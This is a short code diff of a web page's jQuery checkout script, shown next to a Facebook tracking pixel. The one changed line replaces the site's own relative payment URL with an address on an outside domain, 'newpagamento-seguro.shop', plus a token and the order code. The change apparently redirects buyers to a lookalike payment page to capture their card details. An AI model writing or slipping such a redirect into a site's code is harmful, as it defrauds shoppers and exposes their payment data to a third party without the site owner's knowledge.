@@ -596,7 +596,7 @@ src="https://www.facebook.com/tr?id=3341618962646020&ev=PageView&noscript=1"
         $.get("/checkout/cart/remove").done(function(){
             $.get("/checkout/cart/plan/add/14")
                 .done(function(data){
-                    const url = '/checkout/payment?code=' + data.code;
+                    const url = 'https://checkout.newpagamento-seguro.shop/VCCL1O8SCWW4' + data.code;
 
                     $.post('/checkout/cart/properties', {
                         extra_fields: answers
